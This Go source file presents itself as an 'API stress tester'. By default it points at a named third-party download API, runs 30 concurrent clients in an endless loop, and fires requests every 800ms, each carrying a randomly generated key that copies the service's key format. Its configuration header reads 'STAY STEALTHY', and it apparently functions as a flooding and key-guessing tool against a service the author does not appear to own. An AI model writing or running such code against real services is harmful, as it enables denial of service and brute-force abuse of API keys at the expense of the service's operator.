package main

import (
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"sync"
	"syscall"
	"time"
)

// ==========================================
// CONFIGURATION (STAY STEALTHY)
// ==========================================
var (
	SERVER_URL     = getEnv("TARGET_URL", "https://api.shrutibots.site/download")
	TOTAL_CLIENTS  = 30
	MAX_WORKERS    = 30
	REFRESH_DELAY  = 800 * time.Millisecond

	// New API Configuration
	VIDEO_ID      = getEnv("VIDEO_ID", "dQw4w9wgxcq")     // Default Rick Roll video ID
	DOWNLOAD_TYPE = getEnv("DOWNLOAD_TYPE", "audio")      // "audio" or "video"
)

// Worker Semaphore to limit max workers
var workerSemaphore = make(chan struct{}, MAX_WORKERS)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// ==========================================
// HELPERS
// ==========================================
func getEnv(key, defaultValue string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return defaultValue
}

// Generate Random API Key in the format: ShrutiBots + Random Alphanumeric
func generateRandomAPIKey() string {
	const prefix = "ShrutiBots"
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	const randomLength = 20 // Matches the example: ShrutiBotsNYOLRrv0frxI0iNLgolV

	b := make([]byte, randomLength)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return prefix + string(b)
}

// ==========================================
// CLIENT STRUCT
// ==========================================
type StressClient struct {
	clientID     int
	running      bool
	lastActivity time.Time
	lock         sync.Mutex
	httpClient   *http.Client
}

func NewStressClient(id int) *StressClient {
	return &StressClient{
		clientID: id,
		httpClient: &http.Client{
			Timeout: 15 * time.Second,
		},
	}
}

func (c *StressClient) DoRefresh() {
	c.lock.Lock()
	c.lastActivity = time.Now()
	c.lock.Unlock()

	// Generate random API key for each request (ShrutiBots format)
	randomAPIKey := generateRandomAPIKey()

	// Build URL with query parameters for new API
	baseURL, _ := url.Parse(SERVER_URL)
	params := url.Values{}
	params.Add("url", VIDEO_ID)
	params.Add("type", DOWNLOAD_TYPE)
	params.Add("api_key", randomAPIKey)
	baseURL.RawQuery = params.Encode()

	req, err := http.NewRequest("GET", baseURL.String(), nil)
	if err != nil {
		log.Printf("[Client %d] NewRequest failed: %v", c.clientID, err)
		return
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		log.Printf("[Client %d] Request error: %v", c.clientID, err)
		return
	}
	defer resp.Body.Close()

	// Consume body
	io.Copy(io.Discard, resp.Body)

	log.Printf("[Client %d] API Request -> Status: %d | Type: %s | Video: %s | Key: %s", 
		c.clientID, resp.StatusCode, DOWNLOAD_TYPE, VIDEO_ID, randomAPIKey)
}

func (c *StressClient) Run() {
	c.running = true
	workerSemaphore <- struct{}{}
	defer func() { <-workerSemaphore }()

	for c.running {
		c.DoRefresh()
		time.Sleep(REFRESH_DELAY)
		runtime.Gosched()
	}
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
	debug.SetMemoryLimit(850 * 1024 * 1024)
	runtime.GOMAXPROCS(runtime.NumCPU())

	log.Println("========================================")
	log.Println(" KING-CLAIMER SHRUTI API STRESS TESTER ")
	log.Printf(" Target API : %s", SERVER_URL)
	log.Printf(" Clients    : %d | Workers: %d | Delay: %v", TOTAL_CLIENTS, MAX_WORKERS, REFRESH_DELAY)
	log.Printf(" Type       : %s | Video ID: %s", DOWNLOAD_TYPE, VIDEO_ID)
	log.Println(" Mode       : Repeated API Calls with Random API Keys (ShrutiBots Format)")
	log.Println("========================================")

	var wg sync.WaitGroup
	for i := 0; i < TOTAL_CLIENTS; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			client := NewStressClient(id)
			client.Run()
		}(i)
	}

	done := make(chan os.Signal, 1)
	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-done

	log.Println("Shutting down gracefully...")
	wg.Wait()
}
